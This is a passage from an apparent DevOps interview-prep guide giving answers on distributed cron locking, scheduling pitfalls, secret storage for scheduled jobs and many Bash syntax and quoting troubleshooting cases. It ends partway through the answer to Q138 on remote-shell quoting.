### Q94. A cleanup job runs from cron on all 3 nodes of a cluster but must execute on exactly one. How do you do it? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Local locks do not coordinate across hosts. You need leader election or a shared lock.

**What I'd do →**
1. Simplest: schedule it in one place (a single admin host, a Kubernetes CronJob with `concurrencyPolicy: Forbid`, or a CI schedule).
2. If it must run from the nodes, use a shared lock with a TTL:
   ```bash
   # DynamoDB conditional put as a lock that expires after 30 minutes
   now=$(date +%s)
   aws dynamodb put-item --table-name locks \
     --item "{\"id\":{\"S\":\"cleanup\"},\"owner\":{\"S\":\"$(hostname)\"},\"exp\":{\"N\":\"$((now + 1800))\"}}" \
     --condition-expression 'attribute_not_exists(id) OR exp < :now' \
     --expression-attribute-values "{\":now\":{\"N\":\"$now\"}}" 2>/dev/null || exit 0
   ```
3. Or a Postgres advisory lock, Consul `consul lock`, or etcd.
4. Make the job idempotent anyway, in case two runs happen.

**Why →** A distributed lock with expiry avoids both double runs and a stuck lock after a crash.

**Interview tip →** Lead with "move the schedule to one place"; it is simpler than any lock.

</details>

### Q95. A cron job on 500 servers uploads metrics to an API at `0 * * * *`. The API rate-limits and many uploads fail. Fix it. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Thundering herd: every host fires at exactly the same second.

**What I'd do →**
1. With systemd timers: `RandomizedDelaySec=15min` and, on recent systemd, `FixedRandomDelay=true` so each host gets a stable offset.
2. With cron: a stable per-host delay derived from the hostname:
   ```bash
   delay=$(( $(hostname | cksum | cut -d' ' -f1) % 900 ))
   sleep "$delay"
   ```
3. Add retries with exponential backoff and jitter on HTTP 429.
4. Ask whether pull-based collection (Prometheus scraping) fits better than push.

**Why →** Spreading 500 requests across 15 minutes turns a spike into a trickle.

**Interview tip →** Mention a stable offset over a random one, so each host's run time is predictable for debugging.

</details>

### Q96. After a daylight-saving change, a 02:30 job ran twice on one day and not at all on another. How do you prevent this? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** In time zones with DST, 02:30 does not exist on the spring-forward day and occurs twice on the fall-back day. Cron implementations handle this differently.

**What I'd do →**
1. Run servers in UTC (`timedatectl set-timezone UTC`), which has no DST.
2. If a local time is a business requirement, use `OnCalendar=*-*-* 02:30:00 UTC` style explicit zones, or schedule outside the 01:00–03:00 window.
3. Make the job idempotent (date-stamped outputs, "already done today" check) so a double run is harmless.

**Why →** DST bugs only appear twice a year, which makes them hard to catch in testing.

**Interview tip →** Say "servers run in UTC" as a standard, and convert to local time only for display.

</details>

### Q97. A scheduled report job sometimes runs for hours and piles up. It must be killed if it exceeds one hour. How? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Enforce a hard limit at the scheduler level and handle the timeout clearly.

**What I'd do →**
1. systemd: `TimeoutStartSec=1h` in a `Type=oneshot` service; systemd sends `SIGTERM`, then `SIGKILL` after `TimeoutStopSec`, and marks the run failed (`Failed with result 'timeout'`).
2. cron: `flock -n /run/lock/report.lock timeout -k 60 1h /opt/jobs/report.sh`.
3. In the script, trap `TERM` to clean up partial output.
4. Alert on timeouts separately from errors, and investigate why it got slow.

**Why →** A hard limit stops runaway jobs from stacking up and exhausting resources.

**Interview tip →** Mention `timeout`'s exit code 124 so the wrapper can report "timed out" accurately.

</details>

### Q98. A scheduled job needs a database password. Where do you put it for cron and for systemd? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Keep it out of the crontab line, the unit file (world-readable in `/etc/systemd/system`), the script and Git.

**What I'd do →**
1. Cron: a file readable only by the job's user (`install -m 0600 -o jobuser`), read at runtime: `DB_PASS=$(< /etc/jobs/db_pass)`, or a tool-specific file like `~/.pgpass`.
2. systemd 247+: credentials, which are exposed only to the service:
   ```ini
   [Service]
   LoadCredential=db_pass:/etc/jobs/db_pass
   ExecStart=/opt/jobs/report.sh
   ```
   The script reads `"$CREDENTIALS_DIRECTORY/db_pass"`. `LoadCredentialEncrypted=` can keep it encrypted at rest with the TPM or host key.
3. Cloud: fetch from AWS Secrets Manager or SSM Parameter Store with the instance role at runtime.
4. Never use `Environment=DB_PASS=...` in a unit file; `systemctl show` reveals it.

**Why →** Each option limits who can read the secret and keeps it out of version control.

**Interview tip →** Mentioning `LoadCredential=` shows current systemd knowledge.

</details>

### Q99. Management wants a weekly email with disk usage of all servers as an HTML table. How do you build it? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Collect data, render HTML with a here-doc, send with a mail tool.

**What I'd do →**
```bash
{
  cat <<'HTML'
<html><body><h3>Weekly disk usage</h3><table border="1" cellpadding="4">
<tr><th>Host</th><th>Mount</th><th>Used</th><th>Size</th><th>Use%</th></tr>
HTML
  for h in "${hosts[@]}"; do
    ssh -n -o ConnectTimeout=5 "$h" 'df -hP -x tmpfs -x devtmpfs' | awk -v h="$h" 'NR > 1 {
      style = ($5+0 >= 85) ? " style=\"background:#fdd\"" : ""
      printf "<tr%s><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td></tr>\n", style, h, $6, $3, $2, $5}'
  done
  echo '</table></body></html>'
} > /tmp/disk-report.html
mail -a 'Content-Type: text/html' -s "Disk usage $(date +%F)" ops@example.com < /tmp/disk-report.html
```
1. The `mail -a` header syntax is for GNU Mailutils; s-nail and msmtp differ, so test on your distro.
2. Highlight rows above 85% so readers see problems at a glance.

**Why →** A here-doc plus awk is enough for simple HTML; no templating engine needed.

**Interview tip →** Mention that a Grafana dashboard with alerts is better than an email nobody reads, but reports still have their place.

</details>

### Q100. You need to scan 50 GB of compressed logs for a request ID during an incident, as fast as possible. How? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** I/O and decompression are the bottlenecks; parallelize across files and use the fastest matching mode.

**What I'd do →**
```bash
find /var/log/app -name '*.gz' -print0 |
  xargs -0 -P "$(nproc)" -n 4 zgrep -F -H -- 'req-7f3a9c' > /tmp/hits.txt
```
1. `-F` fixed-string matching is much faster than regex; `LC_ALL=C` speeds it up further.
2. `-P $(nproc)` runs one decompressor per core; `-n 4` batches files.
3. Narrow by time first (file names or mtime) to read less data.
4. If installed, `rg -z -F` (ripgrep) searches compressed files in parallel by itself.
5. Run with `nice` on a production host, or copy logs elsewhere.

**Why →** Parallel decompression typically scales nearly linearly with cores until disk throughput becomes the limit.

**Interview tip →** Mention that this is the moment you wish logs were in a central, indexed system, and say how you would make that case after the incident.

</details>

---

## Troubleshooting: syntax, parsing and interpreter errors

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q101. `./deploy.sh` fails with `bash: ./deploy.sh: /bin/bash^M: bad interpreter: No such file or directory` (or, on Bash 5.2, `cannot execute: required file not found`). 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The file has Windows CRLF line endings, so the kernel looks for an interpreter literally named `bash\r`. It was edited on Windows or committed with `core.autocrlf=true`.

**Diagnose →**
```bash
file deploy.sh                 # "... with CRLF line terminators"
head -1 deploy.sh | od -c      # shows \r \n at the end
```

**Fix →** `sed -i 's/\r$//' deploy.sh` or `dos2unix deploy.sh`, then commit the fixed file.

**Prevent →** Add `*.sh text eol=lf` to `.gitattributes`, set the editor to LF for shell files, and run ShellCheck in CI (it reports SC1017 for literal carriage returns).

</details>

### Q102. `bash: ./backup.sh: Permission denied` right after cloning the repo. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The execute bit is not set, either locally or in Git (the file was committed with mode 100644).

**Diagnose →**
```bash
ls -l backup.sh                       # -rw-r--r--
git ls-files -s backup.sh             # 100644 = not executable in Git
```

**Fix →** `chmod +x backup.sh` locally, and record it in Git: `git update-index --chmod=+x backup.sh && git commit -m "make backup.sh executable"`. As a workaround, `bash backup.sh` runs it without the bit.

**Prevent →** Commit scripts with mode 100755, and add a CI check: `git ls-files -s '*.sh' | awk '$1 != "100755" {print "not executable:", $4; bad=1} END {exit bad}'`.

</details>

### Q103. `deploy.sh: line 14: syntax error near unexpected token `fi'` 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The `if` above is malformed: missing `then`, missing `;` before `then` on the same line, an empty `then` block, or a missing space inside `[ ]`.

**Diagnose →**
```bash
bash -n deploy.sh          # syntax check without running
sed -n '8,14p' deploy.sh
```
Typical culprits: `if [ -f "$f" ] then`, `if [ -f "$f"]; then` (no space before `]`), or a `then` followed directly by `fi` with no commands.

**Fix →** `if [[ -f $f ]]; then ... fi`. An empty branch needs a command: `then :`.

**Prevent →** Run `bash -n` and ShellCheck in pre-commit; use an editor with shell syntax highlighting.

</details>

### Q104. `install.sh: line 87: syntax error: unexpected end of file` 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Something opened was never closed: an `if` without `fi`, a loop without `done`, a `case` without `esac`, a `{` without `}`, an unterminated quote, or a here-doc whose closing delimiter is indented or has trailing spaces.

**Diagnose →**
```bash
bash -n install.sh
grep -nE '^\s*(if|fi|for|while|until|done|case|esac)\b' install.sh   # count pairs by eye
grep -n "EOF" install.sh | cat -A | head                              # trailing spaces show as "EOF $"
```

**Fix →** Add the missing terminator or fix the quote. The reported line is the end of the file, not the error location, so bisect by commenting out blocks if the file is large.

**Prevent →** Keep functions short, use `shfmt` (it refuses to format unbalanced code), and lint in CI.

</details>

### Q105. `warning: here-document at line 12 delimited by end-of-file (wanted `EOF')` and the rest of the script never runs. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Bash never found the closing `EOF` line, so it treated the rest of the file as here-doc content. The delimiter is indented with spaces, has trailing whitespace or a `\r`, or is spelled differently.

**Diagnose →**
```bash
grep -n 'EOF' script.sh | cat -A     # look for "  EOF$" or "EOF $" or "EOF^M$"
```

**Fix →** Put the delimiter alone at column 1 with nothing after it. If you want indentation, use `<<-EOF` and indent with **tabs** only.

**Prevent →** `shfmt` and ShellCheck flag broken here-docs; configure the editor to show whitespace.

</details>

### Q106. `bash: [: missing `]'` 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `[` is a command and `]` must be its last, separate argument. Missing space (`[ -f "$f"]`), using `&&` inside `[ ]` (`[ -f a && -f b ]`), or an unquoted variable expanding to nothing in the wrong place.

**Diagnose →** `bash -x script.sh` shows the exact `[` command after expansion.

**Fix →** `[ -f "$f" ]`, `[ -f a ] && [ -f b ]`, or use Bash's `[[ -f a && -f b ]]`.

**Prevent →** Prefer `[[ ]]` in Bash scripts; ShellCheck catches missing spaces (SC1020) and `&&` inside `[ ]` (SC2107).

</details>

### Q107. A script prints `/bin/sh: 1: [[: not found` and then continues as if the test were false. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The script runs under `dash` (Ubuntu's `/bin/sh`), which has no `[[`. It was started with `sh script.sh`, has a `#!/bin/sh` shebang, or runs from a cron line or Dockerfile `RUN` (which uses `/bin/sh -c`).

**Diagnose →**
```bash
head -1 script.sh; ls -l /bin/sh
grep -n 'sh ' /etc/cron.d/* Dockerfile 2>/dev/null
```

**Fix →** Use `#!/usr/bin/env bash` and run it as `./script.sh` or `bash script.sh`; in a Dockerfile use `SHELL ["/bin/bash", "-o", "pipefail", "-c"]`. Or rewrite the test in POSIX form with `[ ]` or `case`.

**Prevent →** Lint with ShellCheck; it warns when the shebang is `sh` and the code uses `[[` (SC3010).

</details>

### Q108. Under `sh`, the script fails with `Syntax error: "(" unexpected`. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Bash-only syntax parsed by dash: an array assignment `hosts=(a b c)`, `function name() {`, or `<(...)` process substitution (which gives `Syntax error: redirection unexpected` instead).

**Diagnose →** `shellcheck -s sh script.sh` lists each bashism with the line number; `checkbashisms script.sh` does the same.

**Fix →** Run it with Bash (fix the shebang or invocation), or port: arrays to `set -- a b c` or newline-separated strings, `function f()` to `f()`, process substitution to a temp file.

**Prevent →** Decide per script: Bash with an explicit shebang, or POSIX sh checked with `shellcheck -s sh`.

</details>

### Q109. `script.sh: 12: Bad substitution` 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** A Bash-only parameter expansion run by dash: `${var//a/b}`, `${var^^}`, `${var:0:3}`, `${!name}`, `${arr[@]}`. Or a typo like `${var-name with space}` or `$(var)` confusion.

**Diagnose →** Check the shell (`ps -p $$ -o comm=` inside the script, or the shebang) and line 12.

**Fix →** Run with Bash, or use POSIX alternatives: `$(printf '%s' "$var" | sed 's/a/b/g')`, `$(printf '%s' "$var" | tr '[:lower:]' '[:upper:]')`, `${var%%.*}`/`${var#*-}` (those are POSIX).

**Prevent →** `shellcheck -s sh` flags these as SC3060 and friends.

</details>

### Q110. `deploy.sh: line 3: APP_ENV: command not found` 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Spaces around `=` in an assignment: `APP_ENV = prod` runs a command named `APP_ENV`. Variants: `APP_ENV= prod` (sets `APP_ENV` to empty for the command `prod`), or a leading `$` (`$APP_ENV=prod`).

**Diagnose →** `sed -n 3p deploy.sh`.

**Fix →** `APP_ENV=prod` with no spaces.

**Prevent →** ShellCheck reports SC1068 ("Don't put spaces around the = in assignments").

</details>

### Q111. Running `bash script.sh` prints `script.sh: line 2: $'\r': command not found` on every blank line. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** CRLF line endings again. Running through `bash` avoids the shebang error, but every blank line now contains just `\r`, which Bash tries to run as a command. Other lines may fail subtly (`cd /srv/app\r` → `No such file or directory`).

**Diagnose →** `cat -A script.sh | head` shows `^M$` at line ends.

**Fix →** `sed -i 's/\r$//' script.sh`.

**Prevent →** `.gitattributes` with `*.sh text eol=lf`; an `.editorconfig` with `end_of_line = lf`.

</details>

### Q112. A script that uses `done < <(kubectl get pods -o name)` fails with `Syntax error: redirection unexpected` in CI but works locally. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The CI step runs the script with `sh` (dash or BusyBox ash), which does not support process substitution. Common in GitLab CI `script:` blocks on Alpine images, or `sh ./script.sh` in a Makefile.

**Diagnose →** Print the shell in the job: `echo "$0"; readlink -f /proc/$$/exe`.

**Fix →** Invoke with Bash (`bash ./script.sh`, install `bash` in Alpine images with `apk add --no-cache bash`), or replace the construct: `kubectl get pods -o name > "$tmp"; while ...; done < "$tmp"`.

**Prevent →** Pin the interpreter via shebang and execute scripts directly, never through `sh`.

</details>

### Q113. `bash: local: can only be used in a function` 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `local` used at the top level of a script, often after moving code out of a function, or in a file that is `source`d at top level.

**Diagnose →** Find the line in the error and check whether it is inside a function body.

**Fix →** Remove `local` for top-level variables, or wrap the code in a function (`main() { ...; }; main "$@"`), which is better practice anyway.

**Prevent →** Keep all logic in functions with a single `main "$@"` call at the bottom.

</details>

### Q114. On a Mac, `declare -A config` fails with `declare: -A: invalid option`. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** macOS ships Bash 3.2 (2007) at `/bin/bash`, which has no associative arrays (added in Bash 4.0). The shebang is `#!/bin/bash` or the user's PATH finds the old Bash first.

**Diagnose →**
```bash
bash --version | head -1
head -1 script.sh
```

**Fix →** `brew install bash`, use `#!/usr/bin/env bash`, and make sure `/opt/homebrew/bin` comes before `/bin` in PATH. Add a version guard: `(( BASH_VERSINFO[0] >= 4 )) || { echo "need Bash 4+" >&2; exit 1; }`.

**Prevent →** Document the minimum Bash version and test in CI on macOS if laptops are a target.

</details>

### Q115. `mapfile: command not found` on one machine but not another. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Bash older than 4.0 (macOS 3.2), or the script is not running under Bash at all (zsh, dash, ash), where `mapfile`/`readarray` do not exist.

**Diagnose →** `echo "$BASH_VERSION"` inside the script (empty means not Bash).

**Fix →** Run with Bash 4+; for portability, replace with a read loop: `arr=(); while IFS= read -r l; do arr+=("$l"); done < <(cmd)`.

**Prevent →** Version guard at the top of scripts that use Bash 4 features.

</details>

### Q116. In your terminal, `echo "Deploy done!"` fails with `bash: !": event not found`. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Interactive history expansion: `!` inside double quotes refers to history. It does not happen in scripts (history expansion is off in non-interactive shells), which is why the same line works in a script.

**Diagnose →** `echo $-` shows `H` when history expansion is on.

**Fix →** Use single quotes (`echo 'Deploy done!'`), escape it (`\!`), put `!` at the end outside quotes, or `set +H` in the interactive shell.

**Prevent →** Use single quotes for literal strings when testing interactively.

</details>

### Q117. A script with the shebang `#!/usr/bin/env bash -e` fails with `/usr/bin/env: 'bash -e': No such file or directory`. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Linux passes everything after the interpreter path as **one** argument, so `env` looks for a program named `bash -e`.

**Diagnose →** The error message shows the combined string in quotes; newer coreutils adds `use -[v]S to pass options in shebang lines`.

**Fix →** Keep the shebang to `#!/usr/bin/env bash` and put options on the next line: `set -Eeuo pipefail`. (`#!/usr/bin/env -S bash -e` works with coreutils 8.30+, but not everywhere.)

**Prevent →** Treat the shebang as interpreter only; all options go in `set`.

</details>

### Q118. A Docker container exits immediately with `exec /entrypoint.sh: exec format error`. The script runs fine with `sh /entrypoint.sh`. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The kernel cannot execute the file directly: it has no shebang line (or the shebang is not on the very first line, e.g. after a blank line or a UTF-8 BOM), or it has CRLF endings. Docker's exec-form `ENTRYPOINT` calls `execve()`, which needs a valid `#!` line.

**Diagnose →**
```bash
head -c 20 entrypoint.sh | od -c     # must start with "#  !  /"; a BOM shows as 357 273 277
file entrypoint.sh
```

**Fix →** Make `#!/bin/sh` (or `#!/usr/bin/env bash`) the first bytes of the file, strip any BOM and CRLF, and `chmod +x`.

**Prevent →** `.gitattributes` for LF, ShellCheck in CI (it flags a missing shebang with SC2148), and a container smoke test in the pipeline.

</details>

### Q119. `[[ $line =~ ^ERROR (.*)$ ]]` fails with `syntax error in conditional expression`. 🔴

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Unquoted spaces inside the regex split it into separate words that `[[ ]]` cannot parse. Quoting the whole regex fixes the syntax but makes it a literal string match.

**Diagnose →** Test the regex alone in a variable and print `BASH_REMATCH`.

**Fix →** Store the regex in a variable and expand it unquoted:
```bash
re='^ERROR (.*)$'
if [[ $line =~ $re ]]; then msg=${BASH_REMATCH[1]}; fi
```
Or escape the space: `^ERROR\ (.*)$`.

**Prevent →** Always put non-trivial regexes in a variable; it also makes them readable and reusable.

</details>

### Q120. A cron job intermittently fails with random syntax errors like `line 212: syntax error near unexpected token `}'`, but only on deploy days. 🔴

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The deploy overwrites the script **in place** while a cron run is executing it. Bash reads scripts incrementally by byte offset, so the running shell continues reading the new file from the old offset and hits garbage.

**Diagnose →** Correlate failure times with deploy times; check how the deploy writes files (`cp` over the target modifies the same inode; `mv` replaces it).

**Fix →** Deploy scripts atomically: write to a temp file in the same directory and `mv` it over the original (the running shell keeps the old inode open). Also wrap script bodies in `main() { ...; }; main "$@"` so the whole file is parsed before execution.

**Prevent →** Use `install` or `mv`-based deployment, never `cp` or `>` onto a live script.

</details>

---

## Troubleshooting: quoting, expansion and tool-input bugs

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q121. `bash: [: too many arguments` 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** An unquoted variable inside `[ ]` contains spaces or glob characters and expands to several words: `[ $status = "active" ]` with `status="not found"`. Also happens with `[ -f $file ]` when `$file` matches multiple files via globbing.

**Diagnose →** `bash -x` shows the expanded test, e.g. `+ '[' not found = active ']'`.

**Fix →** Quote: `[ "$status" = active ]`, or use `[[ $status == active ]]`.

**Prevent →** Quote every expansion; ShellCheck SC2086.

</details>

### Q122. `bash: [: =: unary operator expected` 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The left-hand variable is empty and unquoted, so `[ $env = prod ]` becomes `[ = prod ]`. Usually a missing argument, a failed command substitution, or a typo in the variable name.

**Diagnose →** `bash -x` shows `+ '[' = prod ']'`. Check where the variable is set.

**Fix →** `[ "$env" = prod ]` or `[[ $env == prod ]]`, and validate required values early with `: "${env:?env is required}"`.

**Prevent →** `set -u` catches unset (not empty) variables; quoting handles empty ones.

</details>

### Q123. A disk check fails with `[: 93%: integer expression expected` 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The value contains non-digits: the `%` from `df`, a trailing `\r`, whitespace, a decimal (`93.5`), or an empty string.

**Diagnose →** `printf '%q\n' "$pct"` reveals hidden characters like `$'93%\r'`.

**Fix →** Clean the value before comparing:
```bash
pct=$(df -P / | awk 'NR == 2 {gsub(/%/, "", $5); print $5}')
[[ $pct =~ ^[0-9]+$ ]] || die "unexpected df output: $pct"
(( pct >= 90 )) && alert
```

**Prevent →** Validate numeric input with a regex before arithmetic; for decimals compare with `awk`.

</details>

### Q124. `rm $file` fails with `rm: cannot remove 'monthly': No such file or directory` and `rm: cannot remove 'report.csv'`. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `file="monthly report.csv"` was word-split into two arguments because it was not quoted. A name with `*` would be worse: it would expand to other files.

**Diagnose →** `printf '[%s]\n' $file` shows the split.

**Fix →** `rm -- "$file"`.

**Prevent →** Quote every expansion; test scripts with filenames containing spaces, quotes and leading dashes.

</details>

### Q125. A cleanup script logs `cp: cannot stat '/var/log/app/*.log': No such file or directory` on quiet days. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** No file matched the glob, so Bash passed the pattern literally to `cp`. A `for f in /var/log/app/*.log` loop has the same issue and runs once with the literal pattern.

**Diagnose →** `ls /var/log/app/` on that day; `bash -x` shows the literal `*`.

**Fix →**
```bash
shopt -s nullglob
files=(/var/log/app/*.log)
(( ${#files[@]} )) || { echo "nothing to copy"; exit 0; }
cp -- "${files[@]}" /backup/
```

**Prevent →** Use `nullglob` (or `[[ -e $f ]] || continue` inside loops) whenever a glob may match nothing.

</details>

### Q126. `echo "start" > $logfile` fails with `bash: $logfile: ambiguous redirect` 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The redirect target expanded to zero words (variable empty or unset) or to several words (path contains spaces), so Bash cannot pick one file.

**Diagnose →** `declare -p logfile` to see the value; check where it is set (typo, a config not loaded, a failed `$(...)`).

**Fix →** Quote and validate: `logfile=${LOG_FILE:?LOG_FILE not set}; echo start >> "$logfile"`.

**Prevent →** Quote redirect targets and use `set -u` so unset variables fail loudly.

</details>

### Q127. `hosts[${#hosts[@]}-1]` style code fails with `bash: hosts: bad array subscript`. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** A negative index that does not exist (`${arr[-1]}` on an empty array), or arithmetic in the subscript that produces an invalid value because the array is empty.

**Diagnose →** `declare -p hosts` to see whether it has elements; check where it is filled (`mapfile` from a command that returned nothing).

**Fix →** Guard for empty arrays before indexing:
```bash
(( ${#hosts[@]} )) || die "no hosts found"
last=${hosts[-1]}            # Bash 4.3+
```

**Prevent →** Treat "command returned nothing" as a case to handle explicitly, not an assumption.

</details>

### Q128. Sourcing a shared library a second time fails with `bash: CONFIG_DIR: readonly variable`, and the script exits under `set -e`. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The library declares `readonly CONFIG_DIR=...` at load time and is sourced twice (directly and through another library).

**Diagnose →** `grep -rn 'source\|^\. ' bin/ lib/` to see the include graph.

**Fix →** Add a load guard at the top of the library:
```bash
[[ -n ${_COMMON_LOADED:-} ]] && return 0
readonly _COMMON_LOADED=1
```
Or avoid `readonly` for values that callers may legitimately set.

**Prevent →** Libraries define functions and defaults only; they must be safe to source repeatedly.

</details>

### Q129. A report script fails only at 08:00 and 09:00 with `bash: 08: value too great for base (error token is "08")`. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `hour=$(date +%H)` gives `08` and `09`, and Bash arithmetic treats a leading zero as octal, where 8 and 9 are invalid. At 00–07 it silently works, which is why it went unnoticed.

**Diagnose →** `bash -c 'h=08; echo $((h + 1))'` reproduces it.

**Fix →** Force base 10: `$(( 10#$hour + 1 ))`, or ask for an unpadded value (`date +%-H` with GNU date).

**Prevent →** Use `10#` whenever doing arithmetic on dates, months or zero-padded IDs; test with edge values.

</details>

### Q130. A loop counts errors, but after the loop the count is always 0. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The loop is on the right side of a pipe (`grep ERROR app.log | while read -r l; do count=$((count+1)); done`), so it runs in a subshell and its variables vanish when it ends.

**Diagnose →** `echo "inside: $count"` at the end of the loop body shows the right number; after the loop it is 0.

**Fix →**
```bash
count=0
while IFS= read -r _; do count=$((count + 1)); done < <(grep ERROR app.log)
```
Or `shopt -s lastpipe` in scripts, or simply `count=$(grep -c ERROR app.log || true)`.

**Prevent →** Feed loops with redirection or process substitution, not pipes, when they set variables.

</details>

### Q131. A script that reads `hosts.txt` and SSHes to each host only processes the first host, with no error. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `ssh` inherits the loop's stdin and reads the rest of `hosts.txt` as input for the remote command, so the loop ends after one iteration. `docker exec -i`, `kubectl exec -i` and `mysql` do the same.

**Diagnose →** Add `echo "next: $host"` at the top of the loop; it prints once.

**Fix →** `ssh -n "$host" ...` (stdin from `/dev/null`), `ssh ... < /dev/null`, or read the list on another descriptor: `while read -r host <&3; do ...; done 3< hosts.txt`.

**Prevent →** Always use `ssh -n` (or `-o BatchMode=yes` plus `< /dev/null`) inside read loops.

</details>

### Q132. `sed -i "s/^image:.*/image: $IMAGE/" deploy.yaml` fails with `sed: -e expression #1, char 32: unknown option to `s'` 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** `$IMAGE` contains `/` (`ghcr.io/acme/api:1.4.2`), which ends the `s` command early; sed then reads the rest as flags.

**Diagnose →** `echo "s/^image:.*/image: $IMAGE/"` shows the extra slashes.

**Fix →** Use a delimiter that cannot appear in the value, and escape `&` and `\` in replacements:
```bash
sed -i "s|^\( *image:\).*|\1 ${IMAGE}|" deploy.yaml
```
Better for YAML: `IMAGE=$IMAGE yq -i '.spec.template.spec.containers[0].image = strenv(IMAGE)' deploy.yaml`.

**Prevent →** Use structural tools for structured files; escape values when sed is unavoidable.

</details>

### Q133. `awk "{print $2}" file` prints whole lines instead of the second column. 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Double quotes let the **shell** expand `$2` first (to empty, or the script's second argument), so awk receives `{print }`, which prints the whole line.

**Diagnose →** `set -x` shows `awk '{print }' file`.

**Fix →** Single-quote awk programs and pass shell values with `-v`:
```bash
awk -v col="$col" '{print $col}' file
```

**Prevent →** Always single-quote awk, sed and jq programs. ShellCheck warns about this pattern.

</details>

### Q134. A `while read` loop silently skips the last line of a config file. 🟢

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The file does not end with a newline. `read` returns non-zero at EOF even though it read data into the variable, so the loop body is skipped for the final line.

**Diagnose →** `tail -c1 file | od -c` shows no `\n` at the end.

**Fix →**
```bash
while IFS= read -r line || [[ -n $line ]]; do
  ...
done < file
```

**Prevent →** Configure editors to add a final newline; use the `|| [[ -n $line ]]` idiom in every read loop.

</details>

### Q135. `gzip /var/log/app/*.log` fails with `bash: /usr/bin/gzip: Argument list too long` 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The glob expanded to so many filenames that the arguments exceed the kernel's `ARG_MAX` limit for `execve()`.

**Diagnose →**
```bash
getconf ARG_MAX
find /var/log/app -maxdepth 1 -name '*.log' | wc -l
```

**Fix →** Let `find` batch the arguments:
```bash
find /var/log/app -maxdepth 1 -name '*.log' -exec gzip -- {} +
```

**Prevent →** Use `find -exec {} +` or `xargs -0` for bulk operations; fix the retention that let 300,000 files accumulate.

</details>

### Q136. `find ... | xargs rm` fails with `xargs: unmatched single quote; by default quotes are special to xargs unless you use the -0 option` 🟡

<details>
<summary><b>Answer</b></summary>

**Likely causes →** A filename contains an apostrophe (`O'Brien report.pdf`). Default `xargs` parses quotes and whitespace, so it chokes, and names with spaces would be split.

**Diagnose →** `find ... | grep "'"` finds the offending names.

**Fix →** NUL-separated end to end: `find /data -name '*.tmp' -print0 | xargs -0 -r rm -f --`, or `find /data -name '*.tmp' -delete`.

**Prevent →** Always pair `-print0` with `xargs -0`, or avoid `xargs` for deletes entirely.

</details>

### Q137. A script builds `OPTS="--delete --exclude=.git"` and runs `rsync "$OPTS" src/ dst/`. rsync fails with `rsync: --delete --exclude=.git: unknown option`. 🔴

<details>
<summary><b>Answer</b></summary>

**Likely causes →** Quoting the string passes all options as **one** argument. Removing the quotes "works" until an option value contains a space or a glob, then it breaks differently.

**Diagnose →** `printf '[%s]\n' "$OPTS"` shows a single argument.

**Fix →** Use an array, which keeps each option as a separate, intact argument:
```bash
opts=(--archive --delete --exclude='.git' --exclude='node_modules')
[[ $dry_run == 1 ]] && opts+=(--dry-run)
rsync "${opts[@]}" src/ dst/
```

**Prevent →** Never store command arguments in a plain string; arrays exist for exactly this.

</details>

### Q138. `ssh web1 "rm -rf /srv/app/releases/$old"` deleted the wrong directory when `$old` contained a space. How did that happen? 🔴

<details>
<summary><b>Answer</b></summary>

**Likely causes →** The command is expanded locally, sent as a string, and then **parsed again by the remote shell**. `old="2026 old"` becomes `rm -rf /srv/app/releases/2026 old` remotely: it deletes `releases/2026` and `./old` in the remote home directory. A crafted value could run arbitrary commands.

**Diagnose →** Replace `ssh web1` with `echo` to see the exact string the remote shell will parse.

**Fix →** Validate the value, and quote it for the remote shell with `printf %q`:
```bash
